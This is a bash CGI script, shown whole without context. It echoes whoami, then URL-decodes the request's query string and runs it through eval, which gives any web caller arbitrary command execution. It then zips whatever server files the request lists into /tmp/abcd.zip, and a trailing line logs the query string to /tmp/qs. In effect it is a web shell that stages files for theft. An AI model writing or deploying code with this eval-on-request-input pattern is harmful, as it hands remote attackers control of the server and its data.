#!/bin/bash
PATH=/usr/local/bin:${PATH}
ZIP='/tmp/abcd.zip'
echo -e "Content-type: text/html\n\n"
echo '<html><body><pre>'
whoami
eval $(echo -e $(echo $QUERY_STRING | sed 's/+/ /g' | sed 's/%/\\x/g'))
FILES=($(echo $filelist | base64 -d | jq '.[] | @base64'))
NFILES=${#FILES[@]}
for (( i=0; i<$NFILES; ++i )) 
do
    FILE=$(echo ${FILES[$i]} | sed 's/"//g' | base64 -d)
    if [[ -d "$FILE" ]] 
    then 
        echo "${i} ${FILE} is a directory"  && zip -r -u ${ZIP} "${FILE}"
    else 
        echo "${i} ${FILE} is a file"  && zip -u ${ZIP} "${FILE}"
    fi
done
echo '</pre></body></html>'
exit

echo $QUERY_STRING > /tmp/qs